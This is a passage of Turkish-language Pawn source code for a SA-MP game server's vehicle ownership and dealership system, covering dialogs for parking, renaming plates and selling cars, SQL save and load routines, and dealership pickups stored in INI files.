						 	Araclar[ AracSHP[ AYSItemID[playerid] ][ASHPVehID] ][AracKaravanObj] = CreateDynamicObjectEx(3171, 0, 0, 0, 0, 0, 0, 100.0);
						  	AttachDynamicObjectToVehicle(Araclar[ AracSHP[ AYSItemID[playerid] ][ASHPVehID] ][AracKaravanObj], AracSHP[ AYSItemID[playerid] ][ASHPVehID], 0.084999, -2.125115, -1.144999, -3.014999, 0.000000, 178.890090);

							new KarYazi[500];
							format(KarYazi, 500, "{80FFFF}KARAVAN\n \n{DDDDDD}Sahip {FFC000}%s\n{DDDDDD}Ýçeri girmek için {ADFF2F}/karavan\n{DDDDDD}Aracýnýza takmak için {ADFF2F}Y Tuþu", AracSHP[ AYSItemID[playerid] ][ASHPSahip]);
							Araclar[ AracSHP[ AYSItemID[playerid] ][ASHPVehID] ][AracKaravan3D] = CreateDynamic3DTextLabelEx(KarYazi, -1, 0, 0, 0, 100.0, INVALID_PLAYER_ID, AracSHP[ AYSItemID[playerid] ][ASHPVehID]);
						}

						AracSHP[ AYSItemID[playerid] ][ASHPNeedSave] = true;

						Bilgi(playerid, "Aracýnýzý park ettiniz.");
					}

					case 6: // Aracý Sat
					{
				        new DiaYazi[256];
				        format(DiaYazi, 256, "{DDDDDD}Aracýnýzý {00CED1}%d${DDDDDD}'a satmak istiyor musunuz?", floatround(AracSHP[ AYSItemID[playerid] ][ASHPFiyat] * 0.90));
					    ShowPlayerDialog(playerid, DialogOyuncuAracSat, DIALOG_STYLE_MSGBOX, "{FFC000}Araç Sat", DiaYazi, "Evet", "Hayýr");
					}
				}
	        }else{
	            ShowPlayerAracList(playerid);
	        }
	    }

		case DialogOyuncuAracPlaka:
		{
		    if(response)
		    {
		        if(!strlen(inputtext))
		        {
        			new DiaYazi[256];
		        	format(DiaYazi, 256, "{DDDDDD}Aracýnýzýn Mevcut Plakasý:\n{00CED1}%s\n \n{DDDDDD}Aracýnýzýn plakasýný ne yapmak istiyorsunuz?", AracSHP[ AYSItemID[playerid] ][ASHPPlaka]);
			        ShowPlayerDialog(playerid, DialogOyuncuAracPlaka, DIALOG_STYLE_INPUT, "{FFC000}Araç Plakasý", DiaYazi, "Deðiþtir", "Ýptal");
					Hata(playerid, "Aracýnýz için plaka belirlemediniz!");
		            return 1;
		        }

		        format(AracSHP[ AYSItemID[playerid] ][ASHPPlaka], 50, inputtext);

		        new Float:oX, Float:oY, Float:oZ, Float:oRot, panels, doors, lights, tires, Float:Health;

				GetVehicleDamageStatus(AracSHP[ AYSItemID[playerid] ][ASHPVehID], panels, doors, lights, tires);
		        GetVehiclePos(GetPlayerVehicleID(playerid), oX, oY, oZ);
		        GetVehicleZAngle(GetPlayerVehicleID(playerid), oRot);
		        Arac_FetchMod(AYSItemID[playerid]);

                GetVehicleHealth(AracSHP[ AYSItemID[playerid] ][ASHPVehID], Health);

				SetVehicleNumberPlate(AracSHP[ AYSItemID[playerid] ][ASHPVehID], AracSHP[ AYSItemID[playerid] ][ASHPPlaka]);
				SetVehicleToRespawn(AracSHP[ AYSItemID[playerid] ][ASHPVehID]);
				SetVehiclePos(AracSHP[ AYSItemID[playerid] ][ASHPVehID], oX, oY, oZ);
				SetVehicleZAngle(AracSHP[ AYSItemID[playerid] ][ASHPVehID], oRot);
				PutPlayerInVehicle(playerid, AracSHP[ AYSItemID[playerid] ][ASHPVehID], 0);
				UpdateVehicleDamageStatus(AracSHP[ AYSItemID[playerid] ][ASHPVehID], panels, doors, lights, tires);
				Arac_LoadMod(AYSItemID[playerid]);
				
				SetVehicleHealth(AracSHP[ AYSItemID[playerid] ][ASHPVehID], Health);

				AracSHP[ AYSItemID[playerid] ][ASHPNeedSave] = true;

				Bilgi(playerid, "Aracýnýzýn plakasýný deðiþtirdiniz.");

				ShowPlayerAracMenu(playerid);
		    }else{
		        ShowPlayerAracMenu(playerid);
		    }
		}

	    case DialogOyuncuAracSat:
	    {
	        if(response)
	        {
	            ParaVer(playerid, floatround(AracSHP[ AYSItemID[playerid] ][ASHPFiyat] * 0.90));

				format(Yazi, 128, "Aracýnýzý {00CED1}%d${ADFF2F}'a sattýnýz.", floatround(AracSHP[ AYSItemID[playerid] ][ASHPFiyat] * 0.90));
	            Bilgi(playerid, Yazi);

				new LogYazi[300];
				format(LogYazi, 300, "[ARAC] %s(%d), %d ID'li %s model araci %d$'a satin aldi.", GetName(playerid), playerid, AYSItemID[playerid], VehNames[ AracSHP[ AYSItemID[playerid] ][ASHPModel] - 400 ], floatround(AracSHP[ AYSItemID[playerid] ][ASHPFiyat] * 0.90));
				LOG(LogYazi);

				Arac_Sil(AYSItemID[playerid]);

	            ShowPlayerAracList(playerid);
	        }else{
	            ShowPlayerAracMenu(playerid);
	        }
	    }
	}
	return 1;
}

// ShowPlayerAracMenu
ShowPlayerAracMenu(playerid)
{
	new DiaYazi[2000], Baslik[128];

	format(DiaYazi, 2000, "%s{DDDDDD}Araç Fiyatý\t{00CED1}%d$\n", DiaYazi, AracSHP[ AYSItemID[playerid] ][ASHPFiyat]);
	format(DiaYazi, 2000, "%s{DDDDDD}Araç Plakasý\t{00CED1}%s\n", DiaYazi, AracSHP[ AYSItemID[playerid] ][ASHPPlaka]);

	switch(AracSHP[ AYSItemID[playerid] ][ASHPIzin])
	{
	    case 0:	format(DiaYazi, 2000, "%s{DDDDDD}Araç Eriþimi\t{00CED1}Herkes\n", DiaYazi);
	    case 1:	format(DiaYazi, 2000, "%s{DDDDDD}Araç Eriþimi\t{00CED1}Sadece Siz\n", DiaYazi);
	}
	format(DiaYazi, 2000, "%s{DDDDDD}Araç Kilometresi\t{00CED1}%.2f\n",DiaYazi,AracSHP[ AYSItemID[playerid] ][KM]);
	format(DiaYazi, 2000, "%s{ADFF2F}Aracý Yanýna Çek\t\n", DiaYazi);
	format(DiaYazi, 2000, "%s{ADFF2F}Aracý Park Et\t\n", DiaYazi);
	format(DiaYazi, 2000, "%s{ADFF2F}Aracý Sat\t\n", DiaYazi);

	format(Baslik, 128, "{FFC000}Araç Yönetimi: {80FFFF}%s", VehNames[ AracSHP[ AYSItemID[playerid] ][ASHPModel] - 400 ]);

	ShowPlayerDialog(playerid, DialogOyuncuAracMenu, DIALOG_STYLE_TABLIST, Baslik, DiaYazi, "Seç", "Geri");
	return 1;
}

// ShowPlayerAracList
ShowPlayerAracList(playerid)
{
	new DiaYazi[2000], Sayi;

	format(DiaYazi, 2000, "%sID\tModel\tPlaka\n", DiaYazi);

	foreach(new i:ASHPs)
	{
	    if(AracSHP[i][ASHPExist] == false) continue;
	    if(!strcmp(AracSHP[i][ASHPSahip], GetName(playerid), true))
	    {
	        AYItemID[playerid][Sayi] = i;
	        if(AracSHP[i][ASHPKaravan] == 0) // Karavan Sistemi
	        {
	        	format(DiaYazi, 2000, "%s{DDDDDD}%d\t{ADFF2F}%s\t{00CED1}%s\n", DiaYazi, i, VehNames[ AracSHP[i][ASHPModel] - 400 ], AracSHP[i][ASHPPlaka]);
			}else{
			    format(DiaYazi, 2000, "%s{DDDDDD}%d\t{ADFF2F}%s\t{00CED1}%s\n", DiaYazi, i, "Karavan", AracSHP[i][ASHPPlaka]);
			}
			Sayi++;
		}
	}

	if(Sayi == 0)
	{
	    Hata(playerid, "Kendinize ait bir aracýnýz yok! Galerilerden kendinize araç satýn alabilirsiniz.");
		return 1;
	}

	ShowPlayerDialog(playerid, DialogOyuncuAracList, DIALOG_STYLE_TABLIST_HEADERS, "{FFC000}Araçlarým", DiaYazi, "Seç", "Kapat");
	return 1;
}

// GetPlayerAracCount
GetPlayerAracCount(playerid)
{
	new Sonuc;
	foreach(new i:ASHPs)
	{
	    if(AracSHP[i][ASHPExist] == false) continue;
	    if(!strcmp(GetName(playerid), AracSHP[i][ASHPSahip], true))
	    {
	        Sonuc++;
	    }
	}
	return Sonuc;
}

// Arac_Yeni
Arac_Yeni(Modelr, Sahip[], Float:X, Float:Y, Float:Z, Float:Rot, Renk1, Renk2, Fiyat, Plaka[])
{
	if(Iter_Count(ASHPs) == MAX_SHP_ARAC) return -1;
	new Yazi[60];

	new CreatedID = Iter_Free(ASHPs);
	Iter_Add(ASHPs, CreatedID);
	AracSHP[CreatedID][ASHPExist] = true;
	AracSHP[CreatedID][ASHPNeedSave] = false;

	AracSHP[CreatedID][ASHPModel] = Modelr;
	format(AracSHP[CreatedID][ASHPSahip], 50, Sahip);
	AracSHP[CreatedID][ASHPX] = X;
	AracSHP[CreatedID][ASHPY] = Y;
	AracSHP[CreatedID][ASHPZ] = Z;
	AracSHP[CreatedID][ASHPRot] = Rot;
	AracSHP[CreatedID][ASHPRenk1] = Renk1;
	AracSHP[CreatedID][ASHPRenk2] = Renk2;
	AracSHP[CreatedID][ASHPFiyat] = Fiyat;
	AracSHP[CreatedID][ASHPIzin] = 0;
	format(AracSHP[CreatedID][ASHPPlaka], 50, Plaka);
	AracSHP[CreatedID][ASHPPJ] = 3;
	AracSHP[CreatedID][ASHPNOS] = 0;

	for(new i; i < 14; i++)
	{
	    AracSHP[CreatedID][ASHPMod][i] = 0;
	}

	AracSHP[CreatedID][ASHPNeon] = 0;
	AracSHP[CreatedID][ASHPKaravan] = 0;
	
	AracSHP[CreatedID][KM] = 0.00;

	AracSHP[CreatedID][ASHPVehID] = Add_DynamicVehicle(AracSHP[CreatedID][ASHPModel], AracSHP[CreatedID][ASHPX], AracSHP[CreatedID][ASHPY], AracSHP[CreatedID][ASHPZ], AracSHP[CreatedID][ASHPRot], AracSHP[CreatedID][ASHPRenk1], AracSHP[CreatedID][ASHPRenk2], -1);
	Araclar[ AracSHP[CreatedID][ASHPVehID] ][AracInSHP] = true;
	Araclar[ AracSHP[CreatedID][ASHPVehID] ][AracSHPID] = CreatedID;
	SetVehicleNumberPlate(AracSHP[CreatedID][ASHPVehID], AracSHP[CreatedID][ASHPPlaka]);
	SetVehicleToRespawn(AracSHP[CreatedID][ASHPVehID]);

 	new handle = SQL::Open(SQL::INSERT, "araclar");

    SQL::WriteInt(handle, "ID", CreatedID);
    SQL::WriteInt(handle, "Model", AracSHP[CreatedID][ASHPModel]);
    SQL::WriteString(handle, "Sahip", AracSHP[CreatedID][ASHPSahip]);
    SQL::WriteFloat(handle, "X", AracSHP[CreatedID][ASHPX]);
    SQL::WriteFloat(handle, "Y", AracSHP[CreatedID][ASHPY]);
    SQL::WriteFloat(handle, "Z", AracSHP[CreatedID][ASHPZ]);
    SQL::WriteFloat(handle, "Rot", AracSHP[CreatedID][ASHPRot]);
    SQL::WriteInt(handle, "Renk1", AracSHP[CreatedID][ASHPRenk1]);
    SQL::WriteInt(handle, "Renk2", AracSHP[CreatedID][ASHPRenk2]);
    SQL::WriteInt(handle, "Fiyat", AracSHP[CreatedID][ASHPFiyat]);
    SQL::WriteInt(handle, "Izin", AracSHP[CreatedID][ASHPIzin]);
    SQL::WriteString(handle, "Plaka", AracSHP[CreatedID][ASHPPlaka]);
    SQL::WriteInt(handle, "PJ", AracSHP[CreatedID][ASHPPJ]);
    SQL::WriteInt(handle, "NOS", AracSHP[CreatedID][ASHPNOS]);

	for(new asrn; asrn < 14; asrn++)
	{
	    format(Yazi, 60, "Mod%d", asrn);
    	SQL::WriteInt(handle, Yazi, AracSHP[CreatedID][ASHPMod][asrn]);
	}

    SQL::WriteInt(handle, "Neon", AracSHP[CreatedID][ASHPNeon]);
    SQL::WriteInt(handle, "Karavan", AracSHP[CreatedID][ASHPKaravan]);
    SQL::WriteFloat(handle, "KM", 0);

	SQL::Close(handle);
	return CreatedID;
}

// Arac_Sil
Arac_Sil(AracID)
{
	if(AracSHP[AracID][ASHPExist] == false) return 0;
	Iter_Remove(ASHPs, AracID);
	AracSHP[AracID][ASHPExist] = false;
	AracSHP[AracID][ASHPNeedSave] = false;

	Destroy_Vehicle(AracSHP[AracID][ASHPVehID]);

	SQL::DeleteRow("araclar", "ID", AracID);
	return 1;
}


// Arac_Yukle
forward Arac_Yukle();
public Arac_Yukle()
{
	new CreatedID;
	if(SQL::TableExists("araclar"))
	{
		new handle = SQL::Open(SQL::MTREAD, "araclar");
		new Yazi[60];
		SQL::ReadRetrievedRows(handle, i)
		{
            SQL::ReadInt(handle, "ID", CreatedID, i);

	    	Iter_Add(ASHPs, CreatedID);
	    	AracSHP[CreatedID][ASHPExist] = true;
    		AracSHP[CreatedID][ASHPNeedSave] = false;

    		SQL::ReadInt(handle, "Model", AracSHP[CreatedID][ASHPModel], i);
    		SQL::ReadString(handle, "Sahip", AracSHP[CreatedID][ASHPSahip], 50, i);
    		SQL::ReadFloat(handle, "X", AracSHP[CreatedID][ASHPX], i);
    		SQL::ReadFloat(handle, "Y", AracSHP[CreatedID][ASHPY], i);
    		SQL::ReadFloat(handle, "Z", AracSHP[CreatedID][ASHPZ], i);
    		SQL::ReadFloat(handle, "Rot", AracSHP[CreatedID][ASHPRot], i);
    		SQL::ReadInt(handle, "Renk1", AracSHP[CreatedID][ASHPRenk1], i);
    		SQL::ReadInt(handle, "Renk2", AracSHP[CreatedID][ASHPRenk2], i);
    		SQL::ReadInt(handle, "Fiyat", AracSHP[CreatedID][ASHPFiyat], i);
    		SQL::ReadInt(handle, "Izin", AracSHP[CreatedID][ASHPIzin], i);
   			SQL::ReadString(handle, "Plaka", AracSHP[CreatedID][ASHPPlaka], 50, i);
    		SQL::ReadInt(handle, "PJ", AracSHP[CreatedID][ASHPPJ], i);
    		SQL::ReadInt(handle, "NOS", AracSHP[CreatedID][ASHPNOS], i);
    		
    		

			for(new asrn; asrn < 14; asrn++)
			{
	    		format(Yazi, 60, "Mod%d", asrn);
    			SQL::ReadInt(handle, Yazi, AracSHP[CreatedID][ASHPMod][asrn], i);
			}

            SQL::ReadInt(handle, "Neon", AracSHP[CreatedID][ASHPNeon], i);
            SQL::ReadInt(handle, "Karavan", AracSHP[CreatedID][ASHPKaravan], i);
            
            SQL::ReadFloat(handle, "KM", AracSHP[CreatedID][KM], i);

            if(strfind(AracSHP[CreatedID][ASHPSahip], "Orgut", true) != -1)
            {
				AracSHP[CreatedID][ASHPVehID] = Add_DynamicVehicle(AracSHP[CreatedID][ASHPModel], AracSHP[CreatedID][ASHPX], AracSHP[CreatedID][ASHPY], AracSHP[CreatedID][ASHPZ], AracSHP[CreatedID][ASHPRot], AracSHP[CreatedID][ASHPRenk1], AracSHP[CreatedID][ASHPRenk2], -1);
				Araclar[ AracSHP[CreatedID][ASHPVehID] ][AracInSHP] = true;
				Araclar[ AracSHP[CreatedID][ASHPVehID] ][AracSHPID] = CreatedID;
				SetVehicleNumberPlate(AracSHP[CreatedID][ASHPVehID], AracSHP[CreatedID][ASHPPlaka]);
				SetVehicleToRespawn(AracSHP[CreatedID][ASHPVehID]);
                SQL::ReadInt(handle, "Benzin", AVehicleData[AracSHP[CreatedID][ASHPVehID]][Fuel], i);
				Arac_LoadMod(CreatedID);
			}
		}
		SQL::Close(handle);
	}
}

// Arac_Kaydet
Arac_Kaydet()
{
	new handle, Yazi[60];

	foreach(new AracID:ASHPs)
	{
	    if(AracSHP[AracID][ASHPExist] == false) continue;
	    if(AracSHP[AracID][ASHPNeedSave] == false) continue;
        Arac_FetchMod(AracID);

		handle = SQL::Open(SQL::UPDATE, "araclar", "ID", AracID);

    	SQL::WriteInt(handle, "Model", AracSHP[AracID][ASHPModel]);
    	SQL::WriteString(handle, "Sahip", AracSHP[AracID][ASHPSahip]);
    	SQL::WriteFloat(handle, "X", AracSHP[AracID][ASHPX]);
    	SQL::WriteFloat(handle, "Y", AracSHP[AracID][ASHPY]);
    	SQL::WriteFloat(handle, "Z", AracSHP[AracID][ASHPZ]);
    	SQL::WriteFloat(handle, "Rot", AracSHP[AracID][ASHPRot]);
    	SQL::WriteInt(handle, "Renk1", AracSHP[AracID][ASHPRenk1]);
    	SQL::WriteInt(handle, "Renk2", AracSHP[AracID][ASHPRenk2]);
    	SQL::WriteInt(handle, "Fiyat", AracSHP[AracID][ASHPFiyat]);
    	SQL::WriteInt(handle, "Izin", AracSHP[AracID][ASHPIzin]);
   		SQL::WriteString(handle, "Plaka", AracSHP[AracID][ASHPPlaka]);
    	SQL::WriteInt(handle, "PJ", AracSHP[AracID][ASHPPJ]);
    	SQL::WriteInt(handle, "NOS", AracSHP[AracID][ASHPNOS]);

		for(new asrn; asrn < 14; asrn++)
		{
	    	format(Yazi, 60, "Mod%d", asrn);
    		SQL::WriteInt(handle, Yazi, AracSHP[AracID][ASHPMod][asrn]);
		}

		SQL::WriteInt(handle, "Neon", AracSHP[AracID][ASHPNeon]);
    	SQL::WriteInt(handle, "Karavan", AracSHP[AracID][ASHPKaravan]);
    	SQL::WriteFloat(handle, "KM", AracSHP[AracID][KM]);
    	SQL::WriteInt(handle, "Benzin", AVehicleData[AracSHP[AracID][ASHPVehID]][Fuel]);
    	
  
    	SQL::Close(handle);

    	AracSHP[AracID][ASHPNeedSave] = false;
	}
}

// AracOKaydet
AracOKaydet(AracID)
{
	new handle, Yazi[60];
 	Arac_FetchMod(AracID);

	handle = SQL::Open(SQL::UPDATE, "araclar", "ID", AracID);

	SQL::WriteInt(handle, "Model", AracSHP[AracID][ASHPModel]);
	SQL::WriteString(handle, "Sahip", AracSHP[AracID][ASHPSahip]);
	SQL::WriteFloat(handle, "X", AracSHP[AracID][ASHPX]);
	SQL::WriteFloat(handle, "Y", AracSHP[AracID][ASHPY]);
	SQL::WriteFloat(handle, "Z", AracSHP[AracID][ASHPZ]);
	SQL::WriteFloat(handle, "Rot", AracSHP[AracID][ASHPRot]);
	SQL::WriteInt(handle, "Renk1", AracSHP[AracID][ASHPRenk1]);
	SQL::WriteInt(handle, "Renk2", AracSHP[AracID][ASHPRenk2]);
   	SQL::WriteInt(handle, "Fiyat", AracSHP[AracID][ASHPFiyat]);
   	SQL::WriteInt(handle, "Izin", AracSHP[AracID][ASHPIzin]);
	SQL::WriteString(handle, "Plaka", AracSHP[AracID][ASHPPlaka]);
   	SQL::WriteInt(handle, "PJ", AracSHP[AracID][ASHPPJ]);
   	SQL::WriteInt(handle, "NOS", AracSHP[AracID][ASHPNOS]);

	for(new asrn; asrn < 14; asrn++)
	{
		format(Yazi, 60, "Mod%d", asrn);
    	SQL::WriteInt(handle, Yazi, AracSHP[AracID][ASHPMod][asrn]);
	}

	SQL::WriteInt(handle, "Neon", AracSHP[AracID][ASHPNeon]);
	SQL::WriteInt(handle, "Karavan", AracSHP[AracID][ASHPKaravan]);
	SQL::WriteFloat(handle, "KM", AracSHP[AracID][KM]);
	SQL::WriteInt(handle, "Benzin", AVehicleData[AracSHP[AracID][ASHPVehID]][Fuel]);

	SQL::Close(handle);

	AracSHP[AracID][ASHPNeedSave] = false;
	return 1;
}

// Arac_FetchMod
Arac_FetchMod(AracID)
{
	AracSHP[AracID][ASHPPJ] = Araclar[ AracSHP[AracID][ASHPVehID] ][AracPJ];
	AracSHP[AracID][ASHPRenk1] = Araclar[ AracSHP[AracID][ASHPVehID] ][AracR1];
	AracSHP[AracID][ASHPRenk2] = Araclar[ AracSHP[AracID][ASHPVehID] ][AracR2];

	AracSHP[AracID][ASHPNeon] = Araclar[ AracSHP[AracID][ASHPVehID] ][AracNeon];

	if(Araclar[ AracSHP[AracID][ASHPVehID] ][AracNOS] == true)
	{
		AracSHP[AracID][ASHPNOS] = 1;
	}else{
		AracSHP[AracID][ASHPNOS] = 0;
	}

	if(Araclar[ AracSHP[AracID][ASHPVehID] ][AracKaravan] == true)
	{
		AracSHP[AracID][ASHPKaravan] = 1;
	}else{
		AracSHP[AracID][ASHPKaravan] = 0;
	}

	for(new i; i < 14; i++)
	{
	    AracSHP[AracID][ASHPMod][i] = GetVehicleComponentInSlot(AracSHP[AracID][ASHPVehID], i);
	}
}

// Arac_LoadMod
Arac_LoadMod(AracID)
{
	ChangeVehiclePaintjob(AracSHP[AracID][ASHPVehID], AracSHP[AracID][ASHPPJ]);
	ChangeVehicleColor(AracSHP[AracID][ASHPVehID], AracSHP[AracID][ASHPRenk1], AracSHP[AracID][ASHPRenk2]);

    Araclar[ AracSHP[AracID][ASHPVehID] ][AracPJ] = AracSHP[AracID][ASHPPJ];

    if(AracSHP[AracID][ASHPNeon] != 0)
    {
        new arabaIDb = AracSHP[AracID][ASHPVehID];
 		if(Araclar[arabaIDb][AracNeonObj][0] == -1) Araclar[arabaIDb][AracNeonObj][0] = CreateObject(AracSHP[AracID][ASHPNeon], 0, 0, 0, 0, 0, 0, 100.0);
		if(Araclar[arabaIDb][AracNeonObj][1] == -1) Araclar[arabaIDb][AracNeonObj][1] = CreateObject(AracSHP[AracID][ASHPNeon], 0, 0, 0, 0, 0, 0, 100.0);
		AttachObjectToVehicle(Araclar[arabaIDb][AracNeonObj][0], arabaIDb, -0.8, 0.0, -0.7, 0.0, 0.0, 0.0);
		AttachObjectToVehicle(Araclar[arabaIDb][AracNeonObj][1], arabaIDb, 0.8, 0.0, -0.7, 0.0, 0.0, 0.0);
		Araclar[arabaIDb][AracNeon] = AracSHP[AracID][ASHPNeon];
	}

 	if(AracSHP[AracID][ASHPNOS] == 1)
	{
		Araclar[ AracSHP[AracID][ASHPVehID] ][AracNOS] = true;
	}else{
		Araclar[ AracSHP[AracID][ASHPVehID] ][AracNOS] = false;
	}

	for(new i; i < 14; i++)
	{
	    AddVehicleComponent(AracSHP[AracID][ASHPVehID], AracSHP[AracID][ASHPMod][i]);
	}
}

// NearGaleri
NearGaleri(playerid)
{
	new Sonuc = -1;

	foreach(new i : Gs)
	{
	    if(Galeri[i][GExist] == 1)
	    {
	        if(IsPlayerInRangeOfPoint(playerid, 3.0, Galeri[i][GX], Galeri[i][GY], Galeri[i][GZ]))
	        {
	            Sonuc = i;
	            break;
	        }
	    }
	}
	return Sonuc;
}

// Galeri_Yeni
forward Galeri_Yeni(gType, Float:X, Float:Y, Float:Z);
public Galeri_Yeni(gType, Float:X, Float:Y, Float:Z)
{
	new CreatedID = Iter_Free(Gs);

	Iter_Add(Gs, CreatedID);
	Galeri[CreatedID][GExist] = 1;

	Galeri[CreatedID][GType] = gType;
	Galeri[CreatedID][GX] = X;
	Galeri[CreatedID][GY] = Y;
	Galeri[CreatedID][GZ] = Z;

	Galeri[CreatedID][GPick] = CreateDynamicPickup(1274, 1, Galeri[CreatedID][GX], Galeri[CreatedID][GY], Galeri[CreatedID][GZ], 0, 0);

	new Yazi[256];

	switch(Galeri[CreatedID][GType])
	{
	    case Galeri_Otomobil:
	    {
			format(Yazi, 256, "{80FFFF}GALERÝ\n \n{DDDDDD}Otomobil & Ticari Araç Galerisi\n{FF4040}/galeri");
			Galeri[CreatedID][G3D] = CreateDynamic3DTextLabel(Yazi, -1, Galeri[CreatedID][GX], Galeri[CreatedID][GY], Galeri[CreatedID][GZ], 30.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, 0, 0);

			Galeri[CreatedID][GMapIcon] = CreateDynamicMapIcon(Galeri[CreatedID][GX], Galeri[CreatedID][GY], Galeri[CreatedID][GZ], 55, 0, 0, 0, -1, 10000.0);
	    }

		case Galeri_Motosiklet:
		{
			format(Yazi, 256, "{80FFFF}GALERÝ\n \n{DDDDDD}Motosiklet & Bisiklet Galerisi\n{FF4040}/galeri");
			Galeri[CreatedID][G3D] = CreateDynamic3DTextLabel(Yazi, -1, Galeri[CreatedID][GX], Galeri[CreatedID][GY], Galeri[CreatedID][GZ], 30.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, 0, 0);

			Galeri[CreatedID][GMapIcon] = CreateDynamicMapIcon(Galeri[CreatedID][GX], Galeri[CreatedID][GY], Galeri[CreatedID][GZ], 55, 0, 0, 0, -1, 10000.0);
		}

		case Galeri_Tekne:
		{
			format(Yazi, 256, "{80FFFF}GALERÝ\n \n{DDDDDD}Tekne Galerisi\n{FF4040}/galeri");
			Galeri[CreatedID][G3D] = CreateDynamic3DTextLabel(Yazi, -1, Galeri[CreatedID][GX], Galeri[CreatedID][GY], Galeri[CreatedID][GZ], 30.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, 0, 0);

			Galeri[CreatedID][GMapIcon] = CreateDynamicMapIcon(Galeri[CreatedID][GX], Galeri[CreatedID][GY], Galeri[CreatedID][GZ], 9, 0, 0, 0, -1, 10000.0);
		}

		case Galeri_HavaAraci:
		{
			format(Yazi, 256, "{80FFFF}GALERÝ\n \n{DDDDDD}Uçak & Helikopter Galerisi\n{FF4040}/galeri");
			Galeri[CreatedID][G3D] = CreateDynamic3DTextLabel(Yazi, -1, Galeri[CreatedID][GX], Galeri[CreatedID][GY], Galeri[CreatedID][GZ], 30.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, 0, 0);

			Galeri[CreatedID][GMapIcon] = CreateDynamicMapIcon(Galeri[CreatedID][GX], Galeri[CreatedID][GY], Galeri[CreatedID][GZ], 5, 0, 0, 0, -1, 10000.0);
		}
		case Galeri_Karavan:
		{
			format(Yazi, 256, "{80FFFF}GALERÝ\n \n{DDDDDD}Karavan Galerisi\n{FF4040}/galeri");
			Galeri[CreatedID][G3D] = CreateDynamic3DTextLabel(Yazi, -1, Galeri[CreatedID][GX], Galeri[CreatedID][GY], Galeri[CreatedID][GZ], 30.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, 0, 0);

			Galeri[CreatedID][GMapIcon] = CreateDynamicMapIcon(Galeri[CreatedID][GX], Galeri[CreatedID][GY], Galeri[CreatedID][GZ], 51, 0, 0, 0, -1, 10000.0);
		}
	}

	new FileName[35];
	format(FileName, 35, "%s/Galeri_%d.ini", GALERI_DIZIN, CreatedID);

	new INI:GFile = INI_Open(FileName);

	INI_SetTag(GFile, "glr");

	INI_WriteInt(GFile, "GType", gType);
	INI_WriteFloat(GFile, "X", X);
	INI_WriteFloat(GFile, "Y", Y);
	INI_WriteFloat(GFile, "Z", Z);

	INI_Close(GFile);

	return CreatedID;
}

// Galeri_Sil
forward Galeri_Sil(GaleriID);
public Galeri_Sil(GaleriID)
{
	Galeri[GaleriID][GExist] = 0;
	DestroyDynamicPickup(Galeri[GaleriID][GPick]);
	DestroyDynamic3DTextLabel(Galeri[GaleriID][G3D]);

	Iter_Remove(Gs, GaleriID);

	new FileName[35];
	format(FileName, 35, "%s/Galeri_%d.ini", GALERI_DIZIN, GaleriID);
	fremove(FileName);
}

// Galeri_Yukle
forward Galeri_Yukle();
public Galeri_Yukle()
{
	new GFileName[35], String[256];

	for(new i = 0; i < MAX_GALERI; i++)
	{
		format(GFileName, 35, "%s/Galeri_%d.ini", GALERI_DIZIN, i);

		if(fexist(GFileName))
		{
		    INI_ParseFile(GFileName, "LoadGaleri_%s", .bExtra = true, .extra = i);

			Iter_Add(Gs, i);

			Galeri[i][GPick] = CreateDynamicPickup(1274, 1, Galeri[i][GX], Galeri[i][GY], Galeri[i][GZ], 0, 0);

			switch(Galeri[i][GType])
			{
	    		case Galeri_Otomobil:
	    		{
					format(String, 256, "{80FFFF}GALERÝ\n \n{DDDDDD}Otomobil & Ticari Araç Galerisi\n{FF4040}/galeri");
					Galeri[i][G3D] = CreateDynamic3DTextLabel(String, -1, Galeri[i][GX], Galeri[i][GY], Galeri[i][GZ], 30.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, 0, 0);

					Galeri[i][GMapIcon] = CreateDynamicMapIcon(Galeri[i][GX], Galeri[i][GY], Galeri[i][GZ], 55, 0, 0, 0, -1, 10000.0);
	    		}

				case Galeri_Motosiklet:
				{
					format(String, 256, "{80FFFF}GALERÝ\n \n{DDDDDD}Motosiklet & Bisiklet Galerisi\n{FF4040}/galeri");
					Galeri[i][G3D] = CreateDynamic3DTextLabel(String, -1, Galeri[i][GX], Galeri[i][GY], Galeri[i][GZ], 30.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, 0, 0);

					Galeri[i][GMapIcon] = CreateDynamicMapIcon(Galeri[i][GX], Galeri[i][GY], Galeri[i][GZ], 55, 0, 0, 0, -1, 10000.0);
				}

				case Galeri_Tekne:
				{
					format(String, 256, "{80FFFF}GALERÝ\n \n{DDDDDD}Tekne Galerisi\n{FF4040}/galeri");
					Galeri[i][G3D] = CreateDynamic3DTextLabel(String, -1, Galeri[i][GX], Galeri[i][GY], Galeri[i][GZ], 30.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, 0, 0);

					Galeri[i][GMapIcon] = CreateDynamicMapIcon(Galeri[i][GX], Galeri[i][GY], Galeri[i][GZ], 9, 0, 0, 0, -1, 10000.0);
				}

				case Galeri_HavaAraci:
				{
					format(String, 256, "{80FFFF}GALERÝ\n \n{DDDDDD}Uçak & Helikopter Galerisi\n{FF4040}/galeri");
					Galeri[i][G3D] = CreateDynamic3DTextLabel(String, -1, Galeri[i][GX], Galeri[i][GY], Galeri[i][GZ], 30.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, 0, 0);

					Galeri[i][GMapIcon] = CreateDynamicMapIcon(Galeri[i][GX], Galeri[i][GY], Galeri[i][GZ], 5, 0, 0, 0, -1, 10000.0);
				}
				case Galeri_Karavan:
				{
					format(String, 256, "{80FFFF}GALERÝ\n \n{DDDDDD}Karavan Galerisi\n{FF4040}/galeri");
					Galeri[i][G3D] = CreateDynamic3DTextLabel(String, -1, Galeri[i][GX], Galeri[i][GY], Galeri[i][GZ], 30.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, 0, 0);

					Galeri[i][GMapIcon] = CreateDynamicMapIcon(Galeri[i][GX], Galeri[i][GY], Galeri[i][GZ], 5, 0, 0, 0, -1, 10000.0);
				}
			}

	        Galeri[i][GExist] = 1;
		}
	}
}

// LoadGaleri_glr
forward LoadGaleri_glr(GaleriID, name[], value[]);
public LoadGaleri_glr(GaleriID, name[], value[])
{
